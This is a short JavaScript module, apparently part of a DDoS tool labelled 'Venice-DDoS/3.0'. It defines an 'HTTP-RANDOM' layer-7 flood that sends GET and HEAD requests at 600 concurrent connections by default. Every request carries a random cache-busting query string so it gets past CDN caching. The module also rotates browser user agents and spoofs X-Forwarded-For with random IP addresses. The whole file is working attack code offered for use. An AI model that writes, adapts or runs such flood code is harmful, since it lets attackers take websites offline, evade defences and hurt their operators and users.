'use strict';
const { createHttpMethod } = require('./_http');

const UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
  'curl/8.6.0',
  'python-requests/2.32.0',
  'Venice-DDoS/3.0',
];

const rand = () => Math.random().toString(36).slice(2, 10);

module.exports = {
  name: 'HTTP-RANDOM',
  layer: 7,
  summary: 'Cache-buster flood: unique query string + rotating headers to defeat CDN caching.',
  defaults: { concurrency: 600 },
  create(ctx) {
    const base = ctx.target.path;
    const join = base.includes('?') ? '&' : '?';
    return createHttpMethod(ctx, () => ({
      method: Math.random() < 0.5 ? 'GET' : 'HEAD',
      path: `${base}${join}__cb=${rand()}${rand()}`,
      headers: {
        'User-Agent': UAS[(Math.random() * UAS.length) | 0],
        'Cache-Control': 'no-cache, no-store',
        Pragma: 'no-cache',
        'X-Forwarded-For': `${(Math.random() * 255) | 0}.${(Math.random() * 255) | 0}.${(Math.random() * 255) | 0}.${(Math.random() * 255) | 0}`,
      },
    }));
  },
};
